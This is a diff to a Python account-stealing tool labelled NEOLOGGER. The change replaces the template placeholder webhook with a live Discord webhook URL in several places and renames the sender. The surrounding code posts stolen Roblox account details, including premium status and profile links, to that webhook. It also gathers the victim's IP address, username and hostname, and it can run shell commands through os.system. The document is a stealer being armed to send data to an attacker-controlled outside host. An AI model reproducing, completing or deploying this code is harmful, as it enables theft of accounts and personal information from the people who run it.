@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "https://discord.com/api/webhooks/1411388908582994041/LiGfZxiimvprXZ_mHg-KCAMu2Wp1PnXe4qOBLE6wOylqwPSNI9nDhXKTeG0lU3RZc6GJ"
 
 def command(c):
     os.system(c)
@@ -175,11 +175,11 @@ premium = info['IsPremium']
 
 discord = Discord(url=send_webhook)
 discord.post(
-    username="NEOLOGGER ",
-    avatar_url="https://cdn.discordapp.com/attachments/1064200694455881871/1067842925922373723/34ea20e0747020c021677987211a6353.jpg",
+    username="HIT",
+    avatar_url="https://cdn.discordapp.com/avatars/1411388908582994041/fea665d6e4892cac13b6c4d397fedf1b.webp?size=60",
     embeds=[
         {
-            "username": "NEOLOGGER ",
+            "username": "HIT",
             "title": " 💸 Roblox account 💸",
             "description" : f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 00000000,
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1411388908582994041/LiGfZxiimvprXZ_mHg-KCAMu2Wp1PnXe4qOBLE6wOylqwPSNI9nDhXKTeG0lU3RZc6GJ" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1411388908582994041/LiGfZxiimvprXZ_mHg-KCAMu2Wp1PnXe4qOBLE6wOylqwPSNI9nDhXKTeG0lU3RZc6GJ') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
